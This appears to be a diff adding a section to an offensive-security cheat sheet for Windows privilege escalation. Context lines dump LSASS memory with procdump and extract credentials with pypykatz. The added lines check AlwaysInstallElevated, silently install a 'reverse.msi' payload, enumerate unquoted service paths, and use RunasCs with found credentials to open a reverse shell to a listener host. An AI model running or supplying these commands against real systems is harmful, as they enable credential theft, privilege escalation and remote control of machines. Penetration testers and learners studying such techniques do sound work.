@@ -52,6 +52,23 @@ procdump.exe -accepteula -ma lsass.exe lsass.dmp
 pypykatz lsa minidump lsass.dmp
 ```
 
+### Common service / install wins
+
+```cmd
+:: AlwaysInstallElevated (if both HKLM + HKCU = 1)
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msiexec /quiet /qn /i reverse.msi
+
+:: Unquoted service path / weak service binary ACL — fix path or replace binary after enum
+wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\"
+```
+
+```powershell
+# Run as another user with found password
+.\RunasCs.exe USER PASS cmd.exe -r LHOST:443
+```
+
 ## Linux triage
 
 ```bash
